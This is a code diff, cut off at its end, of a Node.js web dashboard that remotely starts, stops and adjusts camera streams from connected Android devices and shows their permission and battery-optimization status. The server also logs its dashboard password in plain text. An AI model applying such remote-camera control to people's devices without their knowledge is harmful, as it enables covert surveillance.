-        .status-modal-header { display:flex; justify-content:space-between; align-items:center; margin-bottom:16px; padding-bottom:12px; border-bottom:1px solid #2a2a2a; }
-        .status-modal-title { font-size:18px; font-weight:600; }
-        .status-modal-close { background:none; border:none; color:#888; font-size:24px; cursor:pointer; }
-        .status-item { display:flex; justify-content:space-between; align-items:center; padding:10px 0; border-bottom:1px solid #2a2a2a; font-size:14px; }
-        .status-item:last-child { border-bottom:none; }
-        .status-label { color:#888; }
-        .status-allowed { color:#4CAF50; font-weight:600; }
-        .status-denied { color:#f44336; font-weight:600; }
-        .status-pending { color:#FF9800; font-weight:600; }
-        .battery-bar-small { height:6px; background:#2a2a2a; border-radius:3px; overflow:hidden; width:100px; }
-        .battery-fill-small { height:100%; background:linear-gradient(90deg,#4CAF50,#8BC34A); border-radius:3px; }
-        .flex-row { display:flex; align-items:center; gap:10px; }
-        .logout-btn { position:absolute; top:0; right:0; background:none; border:1px solid #333; color:#666; font-size:11px; padding:5px 11px; border-radius:20px; cursor:pointer; transition:all .2s; text-decoration:none; }
-        .logout-btn:hover { border-color:#f44336; color:#f44336; }
-        .header { position:relative; }
+        .video-placeholder { text-align:center; color:#555; padding:20px; }
+        .video-placeholder span { font-size:48px; display:block; margin-bottom:8px; }
+        .video-placeholder .hint { font-size:12px; color:#444; }
+        #streamStatus { position:absolute; top:10px; left:10px; font-size:10px; padding:4px 12px; border-radius:20px; font-weight:600; display:none; }
+        .stream-live { background:rgba(76,175,80,.9); color:#fff; display:block !important; }
+        .stream-waiting { background:rgba(255,152,0,.9); color:#fff; display:block !important; }
+        .stream-noframes{ background:rgba(244,67,54,.9); color:#fff; display:block !important; }
+
+        .controls { display:grid; grid-template-columns:repeat(4,1fr); gap:8px; margin-bottom:16px; }
+        .ctrl-btn { padding:10px; border:none; border-radius:12px; font-size:12px; font-weight:600; cursor:pointer; transition:all .2s; display:flex; flex-direction:column; align-items:center; gap:3px; }
+        .ctrl-btn .icon { font-size:18px; }
+        .ctrl-btn:active { transform:scale(0.95); }
+        .ctrl-btn.start { background:rgba(76,175,80,0.2); color:#4CAF50; border:1px solid rgba(76,175,80,0.3); }
+        .ctrl-btn.start:hover { background:rgba(76,175,80,0.3); }
+        .ctrl-btn.start.active { background:#4CAF50; color:#fff; }
+        .ctrl-btn.stop { background:rgba(244,67,54,0.2); color:#f44336; border:1px solid rgba(244,67,54,0.3); }
+        .ctrl-btn.stop:hover { background:rgba(244,67,54,0.3); }
+        .ctrl-btn.stop.active { background:#f44336; color:#fff; }
+        .ctrl-btn.flip { background:rgba(33,150,243,0.2); color:#2196F3; border:1px solid rgba(33,150,243,0.3); }
+        .ctrl-btn.flip:hover { background:rgba(33,150,243,0.3); }
+        .ctrl-btn.settings { background:rgba(255,193,7,0.2); color:#ffc107; border:1px solid rgba(255,193,7,0.3); }
+        .ctrl-btn.settings:hover { background:rgba(255,193,7,0.3); }
+
+        .settings-panel { background:#1a1a1a; border-radius:12px; padding:16px; border:1px solid #2a2a2a; display:none; margin-bottom:16px; }
+        .settings-panel.show { display:block; }
+        .settings-row { display:flex; align-items:center; justify-content:space-between; padding:6px 0; border-bottom:1px solid #222; }
+        .settings-row:last-child { border-bottom:none; }
+        .settings-label { font-size:13px; color:#aaa; }
+        .settings-control { display:flex; gap:8px; align-items:center; }
+        .settings-control select, .settings-control input { background:#0a0a0a; border:1px solid #333; color:#fff; padding:4px 10px; border-radius:8px; font-size:12px; outline:none; }
+        .settings-control select:focus, .settings-control input:focus { border-color:#667eea; }
+        .settings-control button { background:#667eea; border:none; color:#fff; padding:4px 14px; border-radius:8px; font-size:12px; cursor:pointer; }
+        .settings-control button:hover { opacity:0.8; }
+
+        .device-list { background:#1a1a1a; border-radius:12px; padding:12px 16px; border:1px solid #2a2a2a; max-height:150px; overflow-y:auto; }
+        .device-list::-webkit-scrollbar { width:4px; }
+        .device-list::-webkit-scrollbar-track { background:#111; }
+        .device-list::-webkit-scrollbar-thumb { background:#333; border-radius:4px; }
+        .device-item { display:flex; justify-content:space-between; align-items:center; padding:6px 0; border-bottom:1px solid #222; font-size:12px; }
+        .device-item:last-child { border-bottom:none; }
+        .device-item .name { color:#fff; }
+        .device-item .status { font-size:10px; padding:2px 10px; border-radius:10px; }
+        .device-item .status.online { background:rgba(76,175,80,0.2); color:#4CAF50; }
+        .device-item .status.offline { background:rgba(244,67,54,0.2); color:#f44336; }
+        .device-item .status.streaming { background:rgba(76,175,80,0.3); color:#4CAF50; }
+        .device-item .camera-type { color:#666; font-size:10px; }
+        .device-item .battery { color:#ffc107; font-size:10px; }
+        .device-item .perms { color:#888; font-size:9px; }
+
+        .no-devices { text-align:center; color:#555; padding:20px; font-size:13px; }
+        @media (max-width:500px) { .stats { grid-template-columns:repeat(2,1fr); } .controls { grid-template-columns:repeat(2,1fr); } .header h1 { font-size:18px; } }
     </style>
 </head>
 <body>
 <div class="container">
     <div class="header">
-        <h1>📹 Ludoo Remote</h1>
-        <p id="connMode">Tap on device to view status</p>
-        <a href="/logout" class="logout-btn">🔒 Logout</a>
+        <h1>📷 Ludoo Remote</h1>
+        <a href="/logout" class="logout-btn">🚪 Logout</a>
     </div>
+
+    <div class="device-selector" id="deviceSelector">
+        <button class="device-btn offline" data-id="loading">
+            <span class="status-dot"></span> Loading...
+        </button>
+    </div>
+
     <div class="stats">
-        <div class="stat-card"><div class="stat-label">STATUS</div><div class="stat-value online" id="serverStatus">● Online</div></div>
-        <div class="stat-card"><div class="stat-label">DEVICES</div><div class="stat-value" id="deviceCount">0</div></div>
-        <div class="stat-card"><div class="stat-label">FPS</div><div class="stat-value" id="fpsCount">0</div></div>
+        <div class="stat-card"><div class="stat-label">Status</div><div class="stat-value offline" id="statusVal">● Offline</div></div>
+        <div class="stat-card"><div class="stat-label">Stream</div><div class="stat-value stopped" id="streamVal">⏹ Stopped</div></div>
+        <div class="stat-card"><div class="stat-label">FPS</div><div class="stat-value" id="fpsVal">0</div></div>
+        <div class="stat-card"><div class="stat-label">Quality</div><div class="stat-value" id="qualityVal">240p</div></div>
     </div>
-    <div class="video-container" id="videoContainer">
-        <img id="video"><div id="placeholder" class="video-placeholder"><span>📷</span><br>Select a device first</div>
-        <div class="disconnected-overlay" id="disconnectedOverlay"><span>⚠ DEVICE DISCONNECTED</span><span style="font-size:11px;color:#888;font-weight:400">Last frame frozen — waiting to reconnect...</span></div>
-        <button class="expand-btn" id="expandBtn" title="Expand">⛶</button>
+
+    <div class="video-container">
+        <img id="video" src="" alt="Stream">
+        <div class="video-placeholder" id="placeholder">
+            <span>📹</span>
+            <div>No Stream</div>
+            <div class="hint">Select a device and click Start</div>
+        </div>
+        <div id="streamStatus" class="stream-waiting">⏳ Waiting...</div>
     </div>
-    <div class="video-overlay" id="videoOverlay">
-        <div class="overlay-video-wrap" id="overlayWrap">
-            <img id="overlayVideo" src="" style="display:none;">
-            <div id="overlayPlaceholder" class="video-placeholder" style="display:flex;align-items:center;justify-content:center;height:100%;background:#000;"><div><span style="font-size:36px;">📷</span><br>No stream</div></div>
-            <button class="overlay-corner-btn rotate-btn" id="rotateBtn">🔄 Rotate</button>
-            <button class="overlay-corner-btn close-btn" id="overlayCloseBtn">✕ Close</button>
-            <div class="overlay-resize-handle" id="overlayResizeHandle"></div>
+
+    <div class="controls">
+        <button class="ctrl-btn start" id="btnStart" onclick="sendCommand('start')"><span class="icon">▶️</span> Start</button>
+        <button class="ctrl-btn stop" id="btnStop" onclick="sendCommand('stop')"><span class="icon">⏹️</span> Stop</button>
+        <button class="ctrl-btn flip" onclick="sendCommand('flip')"><span class="icon">🔄</span> Flip</button>
+        <button class="ctrl-btn settings" onclick="toggleSettings()"><span class="icon">⚙️</span> Settings</button>
+    </div>
+
+    <div class="settings-panel" id="settingsPanel">
+        <div class="settings-row"><span class="settings-label">📐 Quality</span>
+            <div class="settings-control">
+                <select id="qualitySelect"><option value="120">120p</option><option value="140">140p</option><option value="240" selected>240p</option><option value="360">360p</option></select>
+                <button onclick="applySettings()">Apply</button>
+            </div>
+        </div>
+        <div class="settings-row"><span class="settings-label">⚡ FPS</span>
+            <div class="settings-control">
+                <select id="fpsSelect"><option value="5">5</option><option value="10">10</option><option value="15" selected>15</option><option value="20">20</option><option value="30">30</option></select>
+                <button onclick="applySettings()">Apply</button>
+            </div>
         </div>
     </div>
-    <div class="controls">
-        <div class="section-title">🎮 CONTROLS</div>
-        <div class="button-group"><button class="btn btn-start" id="startBtn">▶ START</button><button class="btn btn-stop" id="stopBtn">⏹ STOP</button><button class="btn btn-flip" id="flipBtn">🔄 FLIP</button></div>
-        <div class="section-title">📐 QUALITY</div>
-        <div class="quality-grid"><button class="quality-btn" data-quality="120">120p</button><button class="quality-btn" data-quality="140">140p</button><button class="quality-btn active" data-quality="240">240p</button><button class="quality-btn" data-quality="360">360p</button></div>
-        <div class="fps-control"><div class="section-title">⚡ FPS</div><input type="range" id="fpsSlider" min="5" max="30" value="15" step="1" class="fps-slider"><div class="fps-value" id="fpsLabel">15 FPS (Recommended)</div></div>
-    </div>
-    <div class="devices"><div class="section-title">📱 CONNECTED DEVICES</div><div id="devicesList"><div class="empty-devices">No devices connected</div></div></div>
+
+    <div class="device-list" id="deviceList"><div class="no-devices">No devices connected</div></div>
 </div>
-<div id="statusModal" class="status-modal">
-    <div class="status-modal-content">
-        <div class="status-modal-header"><span class="status-modal-title" id="modalDeviceName">Device</span><button class="status-modal-close" onclick="closeStatusModal()">✕</button></div>
-        <div id="modalContent"></div>
-    </div>
-</div>
-<script src="/socket.io/socket.io.js"></script>
+
 <script>
-    // ---- Socket.IO ----
-    const socket = io({ transports: ['websocket', 'polling'] });
-    let wsReady = false;
+let currentDeviceId = null;
+let devicesData = [];
+let streamInterval = null;
+let fpsCounter = 0;
+let socket = null;
 
+// ========== SOCKET.IO ==========
+function connectSocket() {
+    socket = io({ transports: ['websocket', 'polling'] });
+    
     socket.on('connect', () => {
-        wsReady = true;
-        document.getElementById('connMode').textContent = '⚡ WebSocket connected';
-        console.log('WS connected:', socket.id);
-    });
-    socket.on('disconnect', () => {
-        wsReady = false;
-        document.getElementById('connMode').textContent = '⚠ WebSocket disconnected — using HTTP';
-    });
-
-    // Instant device status push from server (no polling needed)
-    socket.on('device_update', (data) => {
-        const idx = currentDevices.findIndex(d => d.id === data.id);
-        if (idx !== -1) {
-            currentDevices[idx] = { ...currentDevices[idx], ...data };
-        } else {
-            currentDevices.push(data);
-        }
-        renderDeviceList();
-        // Update modal if it's showing this device
-        if (selectedDeviceId === data.id) {
-            checkSelectedDeviceStatus(currentDevices);
+        console.log('✅ Socket.IO connected');
+        // Subscribe to current device stream
+        if (currentDeviceId) {
+            socket.emit('subscribe_stream', { deviceId: currentDeviceId });
         }
     });
-
-    // Receive live frame from WebSocket (Android pushed it)
+    
     socket.on('frame', (data) => {
-        if (!isStreaming || !data.image) return;
-        // Accept if: ID matches, OR only 1 device connected (fixes heartbeat vs WS ID mismatch)
-        const idMatch = data.deviceId === selectedDeviceId;
-        const singleDevice = currentDevices.filter(d => d.isConnected).length <= 1;
-        if (!idMatch && !singleDevice) return;
-        if ((data.timestamp || 0) <= lastFrameTs) return;
-        lastFrameTs = data.timestamp || Date.now();
-        updateFrame('data:image/jpeg;base64,' + data.image);
+        if (data.deviceId === currentDeviceId && data.image) {
+            updateFrame('data:image/jpeg;base64,' + data.image);
+        }
     });
-
-    // ---- State ----
-    let selectedDeviceId = null, currentDevices = [], isStreaming = false, wasStreaming = false;
-    let userStoppedStream = false;
-    let frameCount = 0, lastFpsUpdate = Date.now(), framePollTimer = null, lastFrameTs = 0;
-
-    const video = document.getElementById('video'),
-          placeholder = document.getElementById('placeholder'),
-          deviceCountSpan = document.getElementById('deviceCount'),
-          fpsCountSpan = document.getElementById('fpsCount'),
-          devicesList = document.getElementById('devicesList'),
-          fpsSlider = document.getElementById('fpsSlider'),
-          fpsLabel = document.getElementById('fpsLabel'),
-          disconnectedOverlay = document.getElementById('disconnectedOverlay'),
-          overlayVideo = document.getElementById('overlayVideo'),
-          overlayPlaceholder = document.getElementById('overlayPlaceholder'),
-          overlayWrap = document.getElementById('overlayWrap'),
-          videoOverlay = document.getElementById('videoOverlay');
-
-    function updateFrame(src) {
-        video.src = src;
-        video.style.display = 'block';
-        placeholder.style.display = 'none';
-        disconnectedOverlay.classList.remove('show');
-        if (!userStoppedStream) wasStreaming = true;
-        if (videoOverlay.classList.contains('active')) {
-            overlayVideo.src = src;
-            overlayVideo.style.display = 'block';
-            overlayPlaceholder.style.display = 'none';
-        }
-        frameCount++;
-        const now = Date.now();
-        if (now - lastFpsUpdate >= 1000) {
-            fpsCountSpan.textContent = frameCount;
-            frameCount = 0;
-            lastFpsUpdate = now;
-        }
-    }
-
-    // ---- Frame HTTP polling (fallback when WS frames not available) ----
-    function startFramePoll() {
-        stopFramePoll();
-        const fps = parseInt(fpsSlider.value) || 15;
-        const interval = Math.max(50, Math.round(1000 / fps));
-        framePollTimer = setInterval(() => {
-            if (!selectedDeviceId || !isStreaming) return;
-            fetch('/api/frame/' + selectedDeviceId)
-                .then(r => r.json())
-                .then(data => {
-                    if (data.success && data.image && data.ts > lastFrameTs) {
-                        lastFrameTs = data.ts;
-                        updateFrame('data:image/jpeg;base64,' + data.image);
-                    }
-                }).catch(() => {});
-        }, interval);
-    }
-    function stopFramePoll() { if (framePollTimer) { clearInterval(framePollTimer); framePollTimer = null; } }
-
-    // ---- Commands (WS primary, HTTP fallback) ----
-    function sendCommand(command, value) {
-        if (!selectedDeviceId) { alert('Select a device first'); return; }
-        if (wsReady) {
-            socket.emit('send_command', { deviceId: selectedDeviceId, command, value: value ?? null });
-        } else {
-            fetch('/api/command', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ deviceId: selectedDeviceId, command, value: value ?? null })
-            }).catch(() => {});
-        }
-    }
-
-    document.getElementById('startBtn').onclick = () => {
-        if (!selectedDeviceId) { alert('Pehle koi device select karo'); return; }
-        userStoppedStream = false;
-        sendCommand('start');
-        isStreaming = true; wasStreaming = false;
-        disconnectedOverlay.classList.remove('show');
-        startFramePoll();
-    };
-    document.getElementById('stopBtn').onclick = () => {
-        if (!selectedDeviceId) return;
-        userStoppedStream = true;
-        sendCommand('stop');
-        isStreaming = false; wasStreaming = false;
-        stopFramePoll();
-        // Clear main video
-        video.src = ''; video.style.display = 'none';
-        placeholder.style.display = 'block';
-        disconnectedOverlay.classList.remove('show');
-        fpsCountSpan.textContent = '0';
-        // Close overlay and clear overlay video too
-        videoOverlay.classList.remove('active');
-        overlayVideo.src = ''; overlayVideo.style.display = 'none';
-        overlayPlaceholder.style.display = 'flex';
-    };
-    document.getElementById('flipBtn').onclick = () => sendCommand('flip');
-
-    document.querySelectorAll('.quality-btn').forEach(btn => {
-        btn.onclick = () => {
-            document.querySelectorAll('.quality-btn').forEach(b => b.classList.remove('active'));
-            btn.classList.add('active');
-            sendCommand('quality', parseInt(btn.dataset.quality));
-        };
+    
+    socket.on('disconnect', () => {
+        console.log('❌ Socket.IO disconnected');
     });
-    fpsSlider.oninput = () => {
-        const fps = parseInt(fpsSlider.value);
-        fpsLabel.textContent = fps + ' FPS' + (fps === 15 ? ' (Recommended)' : '');
-        sendCommand('fps', fps);
-        if (isStreaming) startFramePoll();
-    };
+}
 
-    // ---- Overlay expand ----
-    let overlayRotation = 0;
-    function setDefaultOverlaySize() {
-        const vw = window.innerWidth, vh = window.innerHeight;
-        let w = Math.round(vw * 0.88), h = Math.round(w * 9 / 16);
-        if (h > vh * 0.82) { h = Math.round(vh * 0.82); w = Math.round(h * 16 / 9); }
-        overlayWrap.style.width = w + 'px'; overlayWrap.style.height = h + 'px';
+function updateFrame(src) {
+    const video = document.getElementById('video');
+    const placeholder = document.getElementById('placeholder');
+    const status = document.getElementById('streamStatus');
+    
+    video.src = src;
+    video.style.display = 'block';
+    placeholder.style.display = 'none';
+    status.className = 'stream-live';
+    status.textContent = '🔴 Live';
+    fpsCounter++;
+}
+
+connectSocket();
+
+// ========== DEVICE FUNCTIONS ==========
+function selectDevice(deviceId) {
+    currentDeviceId = deviceId;
+    document.querySelectorAll('.device-btn').forEach(b => b.classList.remove('active'));
+    const btn = document.querySelector(\`.device-btn[data-id="\${deviceId}"]\`);
+    if (btn) btn.classList.add('active');
+
+    const device = devicesData.find(d => d.id === deviceId);
+    if (device) {
+        document.getElementById('statusVal').textContent = device.isConnected ? '● Online' : '● Offline';
+        document.getElementById('statusVal').className = 'stat-value ' + (device.isConnected ? 'online' : 'offline');
+        document.getElementById('streamVal').textContent = device.streaming ? '▶ Streaming' : '⏹ Stopped';
+        document.getElementById('streamVal').className = 'stat-value ' + (device.streaming ? 'streaming' : 'stopped');
+        document.getElementById('qualityVal').textContent = (device.settings?.quality || 240) + 'p';
     }
-    function applyOverlayTransform() { overlayVideo.style.transform = 'rotate(' + overlayRotation + 'deg)'; }
-    function syncOverlayFrame() {
-        if (video.src && video.style.display !== 'none') {
-            overlayVideo.src = video.src; overlayVideo.style.display = 'block'; overlayPlaceholder.style.display = 'none';
-        } else { overlayVideo.style.display = 'none'; overlayPlaceholder.style.display = 'flex'; }
-        applyOverlayTransform();
+    
+    // Subscribe to stream via WebSocket
+    if (socket && socket.connected) {
+        socket.emit('subscribe_stream', { deviceId });
     }
-    document.getElementById('expandBtn').addEventListener('click', () => { setDefaultOverlaySize(); overlayRotation = 0; applyOverlayTransform(); videoOverlay.classList.add('active'); syncOverlayFrame(); });
-    document.getElementById('overlayCloseBtn').addEventListener('click', () => videoOverlay.classList.remove('active'));
-    document.getElementById('rotateBtn').addEventListener('click', () => { overlayRotation = (overlayRotation + 90) % 360; applyOverlayTransform(); });
+    updateVideoStream();
+}
 
-    // ---- Mouse resize (corner handle) ----
-    let isResizing = false, resizeStartX, resizeStartY, resizeStartW, resizeStartH;
-    document.getElementById('overlayResizeHandle').addEventListener('mousedown', e => {
-        e.preventDefault(); isResizing = true;
-        resizeStartX = e.clientX; resizeStartY = e.clientY;
-        resizeStartW = overlayWrap.offsetWidth; resizeStartH = overlayWrap.offsetHeight;
-    });
-    document.addEventListener('mousemove', e => {
-        if (!isResizing) return;
-        overlayWrap.style.width  = Math.min(window.innerWidth  - 20, Math.max(160, resizeStartW + e.clientX - resizeStartX)) + 'px';
-        overlayWrap.style.height = Math.min(window.innerHeight - 20, Math.max(100, resizeStartH + e.clientY - resizeStartY)) + 'px';
-    });
-    document.addEventListener('mouseup', () => isResizing = false);
+async function loadDevices() {
+    try {
+        const res = await fetch('/api/devices');
+        const data = await res.json();
+        if (!data.success) return;
+        devicesData = data.devices;
 
-    // ---- Touch resize handle (corner, single finger) ----
-    document.getElementById('overlayResizeHandle').addEventListener('touchstart', e => {
-        e.preventDefault(); isResizing = true;
-        resizeStartX = e.touches[0].clientX; resizeStartY = e.touches[0].clientY;
-        resizeStartW = overlayWrap.offsetWidth; resizeStartH = overlayWrap.offsetHeight;
-    }, { passive: false });
-    document.addEventListener('touchmove', e => {
-        if (!isResizing) return;
-        e.preventDefault();
-        overlayWrap.style.width  = Math.min(window.innerWidth  - 20, Math.max(160, resizeStartW + e.touches[0].clientX - resizeStartX)) + 'px';
-        overlayWrap.style.height = Math.min(window.innerHeight - 20, Math.max(100, resizeStartH + e.touches[0].clientY - resizeStartY)) + 'px';
-    }, { passive: false });
-    document.addEventListener('touchend', () => isResizing = false);
-
-    // ---- Pinch-to-zoom (two fingers on overlay video) ----
-    let pinchStartDist = 0, pinchStartW = 0, pinchStartH = 0;
-    function getTouchDist(touches) {
-        const dx = touches[0].clientX - touches[1].clientX;
-        const dy = touches[0].clientY - touches[1].clientY;
-        return Math.sqrt(dx * dx + dy * dy);
-    }
-    overlayWrap.addEventListener('touchstart', e => {
-        if (e.touches.length === 2) {
-            e.preventDefault();
-            pinchStartDist = getTouchDist(e.touches);
-            pinchStartW = overlayWrap.offsetWidth;
-            pinchStartH = overlayWrap.offsetHeight;
+        const selector = document.getElementById('deviceSelector');
+        selector.innerHTML = '';
+        if (devicesData.length === 0) {
+            selector.innerHTML = '<button class="device-btn offline">No devices</button>';
+            document.getElementById('deviceList').innerHTML = '<div class="no-devices">No devices connected</div>';
+            return;
         }
-    }, { passive: false });
-    overlayWrap.addEventListener('touchmove', e => {
-        if (e.touches.length === 2) {
-            e.preventDefault();
-            const dist = getTouchDist(e.touches);
-            const scale = dist / pinchStartDist;
-            const newW = Math.min(window.innerWidth - 20, Math.max(160, pinchStartW * scale));
-            const newH = Math.min(window.innerHeight - 20, Math.max(100, pinchStartH * scale));
-            overlayWrap.style.width  = newW + 'px';
-            overlayWrap.style.height = newH + 'px';
-        }
-    }, { passive: false });
 
-    // ---- Device modal ----
-    function closeStatusModal() { document.getElementById('statusModal').style.display = 'none'; }
-    function showDeviceStatus(device) {
-        document.getElementById('modalDeviceName').textContent = '📱 ' + device.name;
-        const battery = device.batteryPercentage || 0;
-        const ws = device.hasWebSocket;
-        document.getElementById('modalContent').innerHTML =
-            '<div class="status-item"><span class="status-label">Connection</span><span class="' + (device.isConnected ? 'status-allowed' : 'status-denied') + '">' + (device.isConnected ? '● Connected' : '● Disconnected') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">WebSocket</span><span class="' + (ws ? 'status-allowed' : 'status-pending') + '">' + (ws ? '⚡ Active' : '⏳ HTTP only') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Camera Permission</span><span class="' + (device.cameraPermission ? 'status-allowed' : 'status-denied') + '">' + (device.cameraPermission ? 'Allowed' : 'Denied') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Battery Optimization</span><span class="' + (device.batteryOptimization ? 'status-allowed' : 'status-denied') + '">' + (device.batteryOptimization ? '✅ Ignored (Allowed)' : '❌ Not Ignored (Denied)') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Camera Ready</span><span class="' + (device.cameraReady ? 'status-allowed' : 'status-pending') + '">' + (device.cameraReady ? 'Yes' : 'No') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Streaming</span><span class="' + (device.streaming ? 'status-allowed' : 'status-pending') + '">' + (device.streaming ? 'Active' : 'Idle') + '</span></div>' +
-            '<div class="status-item"><span class="status-label">Battery</span><div class="flex-row"><span>' + battery + '%</span><div class="battery-bar-small"><div class="battery-fill-small" style="width:' + battery + '%"></div></div></div></div>' +
-            '<div class="status-item"><span class="status-label">Last Heartbeat</span><span style="color:#ccc">' + (device.lastHeartbeat || 'N/A') + '</span></div>';
-        document.getElementById('statusModal').style.display = 'flex';
-    }
-
-    // ---- Device list ----
-    function selectDevice(deviceId) {
-        if (selectedDeviceId === deviceId) return; // already selected
-        // Stop any running stream for old device before switching
-        if (isStreaming) { sendCommand('stop'); stopFramePoll(); }
-        selectedDeviceId = deviceId;
-        wasStreaming = false; isStreaming = false; userStoppedStream = false;
-        lastFrameTs = 0;
-        disconnectedOverlay.classList.remove('show');
-        video.src = ''; video.style.display = 'none';
-        placeholder.textContent = '▶ Press START to stream'; placeholder.style.display = 'block';
-        fpsCountSpan.textContent = '0';
-        renderDeviceList();
-    }
-
-    function renderDeviceList() {
-        const connected = currentDevices.filter(d => d.isConnected);
-        deviceCountSpan.textContent = connected.length;
-        if (connected.length === 0) { devicesList.innerHTML = '<div class="empty-devices">No devices connected</div>'; return; }
-        devicesList.innerHTML = connected.map(d =>
-            '<div class="device-item' + (d.id === selectedDeviceId ? ' selected' : '') + '" data-id="' + d.id + '">' +
-            '<div style="display:flex;align-items:center;gap:8px;flex:1;min-width:0;">' +
-            '<span class="device-name" style="flex:1;white-space:nowrap;overflow:hidden;text-overflow:ellipsis;">📱 ' + d.name + (d.hasWebSocket ? ' <span style="font-size:10px;color:#4CAF50">⚡WS</span>' : '') + '</span>' +
-            (d.streaming ? '<span style="font-size:10px;color:#4CAF50;white-space:nowrap;">● LIVE</span>' : '') +
-            '</div>' +
-            '<div style="display:flex;align-items:center;gap:8px;">' +
-            '<button data-info="' + d.id + '" style="background:none;border:1px solid #444;color:#888;font-size:11px;padding:3px 8px;border-radius:8px;cursor:pointer;">ℹ Info</button>' +
-            '<div class="device-status-dot status-connected"></div>' +
-            '</div></div>'
-        ).join('');
-        devicesList.querySelectorAll('.device-item').forEach(el => {
-            el.addEventListener('click', (e) => {
-                if (e.target.dataset.info) { const d = currentDevices.find(x => x.id === e.target.dataset.info); if (d) showDeviceStatus(d); return; }
-                selectDevice(el.dataset.id);
-            });
+        devicesData.forEach(d => {
+            const btn = document.createElement('button');
+            btn.className = 'device-btn ' + (d.isConnected ? 'online' : 'offline');
+            btn.dataset.id = d.id;
+            btn.innerHTML = \`<span class="status-dot"></span> \${d.name || d.id.slice(0,12)}\`;
+            btn.onclick = () => selectDevice(d.id);
+            selector.appendChild(btn);
         });
-    }
 
-    function checkSelectedDeviceStatus(list) {
-        if (!selectedDeviceId) return;
-        const sel = list.find(d => d.id === selectedDeviceId);
-        if (sel && !sel.isConnected && isStreaming) {
-            // Device went offline while streaming — show overlay, pause poll
-            wasStreaming = true; stopFramePoll(); disconnectedOverlay.classList.add('show'); fpsCountSpan.textContent = '0';
-        } else if (sel && sel.isConnected && wasStreaming && !isStreaming && !userStoppedStream) {
-            // Device came back online — auto-resume only if user didn't manually stop
-            wasStreaming = false; isStreaming = true; disconnectedOverlay.classList.remove('show'); sendCommand('start'); startFramePoll();
+        const list = document.getElementById('deviceList');
+        list.innerHTML = devicesData.map(d => \`
+            <div class="device-item">
+                <span class="name">\${d.name || d.id.slice(0,16)}</span>
+                <span class="camera-type">📷 \${d.camera || 'back'}</span>
+                <span class="battery">🔋 \${d.batteryPercentage || 0}%</span>
+                <span class="perms">📋 \${d.cameraPermission ? '✅' : '❌'} \${d.batteryOptimization ? '⚡' : ''}</span>
+                <span class="status \${d.isConnected ? 'online' : 'offline'}">
+                    \${d.isConnected ? '● Online' : '○ Offline'}
+                    \${d.streaming ? ' 📹' : ''}
+                </span>
+            </div>
+        \`).join('');
+
+        if (devicesData.length > 0 && !currentDeviceId) {
+            selectDevice(devicesData[0].id);
         }
+    } catch (e) {
+        console.error('Load devices error:', e);
+    }
+}
+
+function updateVideoStream() {
+    const video = document.getElementById('video');
+    const placeholder = document.getElementById('placeholder');
+    const status = document.getElementById('streamStatus');
+
+    if (!currentDeviceId) {
+        video.style.display = 'none';
+        placeholder.style.display = 'block';
+        status.className = 'stream-waiting';
+        status.textContent = '⏳ No device selected';
+        return;
     }
 
-    async function fetchDevices() {
-        try {
-            const data = await fetch('/api/devices').then(r => r.json());
-            if (data.success) {
-                currentDevices = data.devices;
-                if (!selectedDeviceId && currentDevices.filter(d => d.isConnected).length > 0) {
-                    selectDevice(currentDevices.filter(d => d.isConnected)[0].id);
-                    return;
-                }
-                checkSelectedDeviceStatus(currentDevices);
-                renderDeviceList();
-            }
-        } catch(e) {}
+    const device = devicesData.find(d => d.id === currentDeviceId);
+    if (!device || !device.streaming) {
+        video.style.display = 'none';
+        placeholder.style.display = 'block';
+        status.className = 'stream-waiting';
+        status.textContent = '⏳ Stream stopped';
+        if (streamInterval) { clearInterval(streamInterval); streamInterval = null; }
+        return;
     }
 
-    fetchDevices();
-    setInterval(fetchDevices, 3000);
+    video.style.display = 'block';
+    placeholder.style.display = 'none';
+    status.className = 'stream-live';
+    status.textContent = '🔴 Live';
+
+    if (streamInterval) clearInterval(streamInterval);
+    streamInterval = setInterval(() => {
+        const img = document.getElementById('video');
+        img.src = '/api/frame/' + currentDeviceId + '?t=' + Date.now();
+        fpsCounter++;
+    }, 100);
+}
+
+async function sendCommand(command) {
+    if (!currentDeviceId) {
+        alert('Please select a device first');
+        return;
+    }
+    try {
+        const res = await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId: currentDeviceId, command })
+        });
+        const data = await res.json();
+        if (data.success) {
+            console.log('✅ Command sent:', command);
+            await loadDevices();
+            if (command === 'start' || command === 'stop') updateVideoStream();
+        }
+    } catch (e) {
+        console.error('Command error:', e);
+    }
+}
+
+function toggleSettings() {
+    document.getElementById('settingsPanel').classList.toggle('show');
+}
+
+async function applySettings() {
+    if (!currentDeviceId) return;
+    const quality = parseInt(document.getElementById('qualitySelect').value);
+    const fps = parseInt(document.getElementById('fpsSelect').value);
+    try {
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId: currentDeviceId, command: 'quality', value: quality })
+        });
+        await fetch('/api/command', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ deviceId: currentDeviceId, command: 'fps', value: fps })
+        });
+        document.getElementById('qualityVal').textContent = quality + 'p';
+        alert('✅ Settings applied!');
+    } catch (e) {
+        alert('❌ Failed to apply settings');
+    }
+}
+
+setInterval(() => {
+    document.getElementById('fpsVal').textContent = fpsCounter;
+    fpsCounter = 0;
+}, 1000);
+
+setInterval(loadDevices, 5000);
+loadDevices();
 </script>
 </body>
 </html>`);
 });
 
+// ========== START ==========
 const PORT = process.env.PORT || 5000;
 server.listen(PORT, '0.0.0.0', () => {
     console.log('');
     console.log('═══════════════════════════════════════════════════');
-    console.log('✅  Ludoo Camera Remote  —  WebSocket + HTTP Mode');
+    console.log('✅  Ludoo Camera Remote  —  Server Ready');
     console.log('═══════════════════════════════════════════════════');
-    console.log('🌐  Web UI       : http://localhost:' + PORT);
-    console.log('⚡  WS Events    : register_stream / stream_frame / send_command');
-    console.log('❤️   Heartbeat    : POST /api/heartbeat');
+    console.log(`🌐  Web UI       : http://localhost:${PORT}`);
+    console.log(`🔑  Password     : ${DASHBOARD_PASSWORD}`);
+    console.log('📡  Commands     : HTTP Polling Only');
